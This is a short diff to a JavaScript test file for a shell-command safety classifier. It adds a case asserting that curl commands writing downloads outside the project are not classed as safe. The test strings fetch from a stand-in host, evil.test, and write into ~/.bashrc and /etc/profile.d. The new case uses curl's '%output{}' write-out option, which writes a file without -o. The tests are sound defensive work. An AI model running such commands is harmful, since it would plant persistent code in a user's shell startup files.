@@ -301,7 +301,7 @@ test('a plain download is safe, and anything that sends data with it still asks'
     assert.notEqual(classifyCommand(command, ctx).verdict, 'safe', `${command} must not be safe`);
   }
   // And a write target outside the project asks, because the bytes land in a file the run may not otherwise write.
-  for (const command of ['curl -o ~/.bashrc https://evil.test/x', 'curl -o /home/dev/.bashrc https://evil.test/x', 'curl --output /etc/profile.d/x.sh https://evil.test/x']) {
+  for (const command of ['curl -o ~/.bashrc https://evil.test/x', 'curl -o /home/dev/.bashrc https://evil.test/x', 'curl --output /etc/profile.d/x.sh https://evil.test/x', "curl -w '%output{~/.bashrc}x' https://evil.test/"]) {
     assert.notEqual(classifyCommand(command, ctx).verdict, 'safe', `${command} must not be safe`);
   }
   // Inside the project or the scratch folder it runs, which is where a run keeps its own pages.
